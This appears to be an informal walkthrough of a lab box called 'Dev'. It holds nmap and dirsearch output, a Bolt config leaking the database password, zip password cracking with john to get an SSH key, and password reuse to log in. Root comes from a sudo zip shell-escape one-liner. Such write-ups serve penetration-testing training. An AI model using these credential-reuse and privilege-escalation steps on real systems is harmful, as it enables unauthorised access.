


# nmap 

```
kali@kali ~> nmap -sC -sV -Pn -p- -T4 192.168.100.168
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 17:43 EST
Nmap scan report for 192.168.100.168
Host is up (0.0026s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Bolt - Installation error
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34803/tcp   mountd
|   100005  1,2,3      44417/tcp6  mountd
|   100005  1,2,3      48835/udp   mountd
|   100005  1,2,3      55798/udp6  mountd
|   100021  1,3,4      43350/udp   nlockmgr
|   100021  1,3,4      44093/tcp   nlockmgr
|   100021  1,3,4      44537/udp6  nlockmgr
|   100021  1,3,4      45611/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
34803/tcp open  mountd   1-3 (RPC #100005)
37829/tcp open  mountd   1-3 (RPC #100005)
40073/tcp open  mountd   1-3 (RPC #100005)
44093/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds

```


- 22 SSH
- 80 web port
	- Apache httpd 2.4.38
- 111 RPC 
- 2049 NFS
- 8080 PHP WEB
- 34803
- 37829
- 40073
- 44093

the network settings are bridged to make shit easier for u, just exploit. don't use any previous knowledge obviously remember heath loves real-life scenario's (OSINT, Credentials re-use, etc. )


# Port 80


![[Dev-20240222210842286.webp|651]]


```
kali@kali ~> dirsearch -u http://192.168.100.168/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.100.168/__24-02-22_13-09-47.txt

Target: http://192.168.100.168/

[13:09:47] Starting: 
[13:09:49] 200 -  931B  - /.gitignore
[13:09:49] 403 -  280B  - /.ht_wsr.txt
[13:09:49] 403 -  280B  - /.htaccess.bak1
[13:09:49] 403 -  280B  - /.htaccess.orig
[13:09:49] 403 -  280B  - /.htaccess.sample
[13:09:49] 403 -  280B  - /.htaccess.save
[13:09:49] 403 -  280B  - /.htaccess_extra
[13:09:49] 403 -  280B  - /.htaccessBAK
[13:09:49] 403 -  280B  - /.htaccess_sc
[13:09:49] 403 -  280B  - /.htaccessOLD
[13:09:49] 403 -  280B  - /.htaccess_orig
[13:09:49] 403 -  280B  - /.htaccessOLD2
[13:09:49] 403 -  280B  - /.html
[13:09:49] 403 -  280B  - /.htm
[13:09:49] 403 -  280B  - /.htpasswd_test
[13:09:49] 403 -  280B  - /.httr-oauth
[13:09:49] 403 -  280B  - /.htpasswds
[13:09:50] 403 -  280B  - /.php
[13:10:02] 301 -  316B  - /app  ->  http://192.168.100.168/app/
[13:10:02] 200 -  553B  - /app/cache/
[13:10:02] 200 -  525B  - /app/
[13:10:06] 200 -  206KB - /composer.lock
[13:10:06] 200 -  971B  - /composer.json
[13:10:26] 301 -  319B  - /public  ->  http://192.168.100.168/public/
[13:10:27] 200 -  345B  - /README.md
[13:10:29] 302 -  332B  - /public/  ->  /public/bolt/userfirst
[13:10:29] 403 -  280B  - /server-status
[13:10:29] 403 -  280B  - /server-status/
[13:10:32] 200 -  443B  - /src/
[13:10:32] 301 -  316B  - /src  ->  http://192.168.100.168/src/
[13:10:37] 200 -    0B  - /vendor/autoload.php
[13:10:37] 200 -  830B  - /vendor/
[13:10:37] 200 -    0B  - /vendor/composer/autoload_static.php
[13:10:37] 200 -    0B  - /vendor/composer/autoload_psr4.php
[13:10:37] 200 -    0B  - /vendor/composer/ClassLoader.php
[13:10:37] 200 -    0B  - /vendor/composer/autoload_files.php
[13:10:37] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[13:10:37] 200 -    1KB - /vendor/composer/LICENSE
[13:10:37] 200 -    0B  - /vendor/composer/autoload_classmap.php
[13:10:37] 200 -    0B  - /vendor/composer/autoload_real.php
[13:10:37] 200 -  191KB - /vendor/composer/installed.json

Task Completed

```


we shall investigate `src` directory first

![[Dev-20240222212447043.webp|750]]



![[Dev-20240222212516827.webp|1253]]


for some reason all the php files are emtpy and looking at the source code theres no return, so lets move over to the other directories



![[Dev-20240222213101001.webp|855]]

immediately we have some JUICY files looking at us.. so im going to in order just open them and examine them starting with the `config.yml` file and low and behold

```
# Database setup. The driver can be either 'sqlite', 'mysql' or 'postgres'.
#
# For SQLite, only the databasename is required. However, MySQL and PostgreSQL
# also require 'username', 'password', and optionally 'host' ( and 'port' ) if the database
# server is not on the same host as the web server.
#
# If you're trying out Bolt, just keep it set to SQLite for now.
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java

# The name of the website
sitename: A sample site
payoff: The amazing payoff goes here

# mailoptions:
#     transport: smtp
#     spool: true
#     host: localhost
#     port: 25
#     username: username
#     password: password
#     encryption: null
#     auth_mode: null
#     senderMail: null
#     senderName: null

# mailoptions:
#     transport: mail
#     spool: false
```


so far we have very important thing to keep in mind now, CREDENTIALS!!. the SMTP ones where commented out but they still might be used somewhere on something. checking all of the other files we yield no results sadly 


lets go to the next port which is `111` which seems to be something related to `NFS` 



```
kali@kali ~> zip2john save.zip > save.hash
ver 2.0 efh 5455 efh 7875 save.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1435, decmplen=1876, crc=15E468E2 ts=2A0D cs=2a0d type=8
ver 2.0 efh 5455 efh 7875 save.zip/todo.txt PKZIP Encr: TS_chk, cmplen=138, decmplen=164, crc=837FAA9E ts=2AA1 cs=2aa1 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
kali@kali ~> john -w=/usr/share/wordlists/rockyou.txt save.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)

```



```
kali@kali ~> john --show save.hash
save.zip:java101::save.zip:todo.txt, id_rsa:save.zip
1 password hash cracked, 0 left                                                                                                                                                             
```


```
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin  
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin  
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false  
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin  
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
```


`jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash`



```
kali@kali ~> ssh -i id_rsa jeanpaul@10.0.2.4
The authenticity of host '10.0.2.4 (10.0.2.4)' can't be established.
ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.4' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': I_love_java <--------------------------- credential re-use
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ 

```


# Privilege escalation

```
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# sudo rm $TF
rm: missing operand
Try 'rm --help' for more information.
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
# cd /root
# ls
flag.txt
# cat flag.txt
Congratz on rooting this box !

```

https://gtfobins.github.io/gtfobins/zip/